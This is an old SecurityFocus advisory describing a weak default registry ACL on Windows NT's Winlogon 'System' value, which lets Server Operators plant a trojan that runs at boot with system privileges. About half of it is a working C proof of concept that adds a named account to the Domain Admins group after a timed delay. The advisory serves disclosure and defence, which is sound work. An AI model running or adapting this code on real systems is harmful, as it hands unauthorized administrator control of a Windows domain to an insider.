source: http://www.securityfocus.com/bid/182/info

The default ACL over the HKEY_Local_Machine\Software\Microsoft\Windows NT\CurrentVersion\Winlogon key "System" value includes an entry for Server Operators:Special. The Special setting allows Server Ops to "Set" this value. A malicious System Operator could place reference to a trojan in this entry. This trojan would be executed under system privileges the next time the system is booted. As the trojan has been called by the system, the system account has privileges to execute code that would elevate the permission of a selected account to "administrator".

Due to the command parsing in this registry key, it is not possible to execute anything "interactive" (ie User Manager, Server Manager), anything with command line arguments, or anything that attempts to interact with the LSASS immediately after logon. Sample code has been posted in the exploit section that will perform privilege escalation without any of the above limitations. 

/* GetadmforSops.exe - David Litchfield 11 Jan 1999 */
/* Compile with eg Visual C++ and link with netapi32.lib */

#define UNICODE
#include <windows.h>
#include <wchar.h>
#include <lmaccess.h>
#include <winbase.h>

int __cdecl wmain (void)
{
LPWSTR group = L"Domain Admins";
LPWSTR acc = L"acc_name";

NET_API_STATUS nas=0;

_sleep(180000);
if( (nas=NetGroupAddUser(NULL, group, acc)) == 0)
{
wprintf(L"Success");
return 0;
}
return 0;
}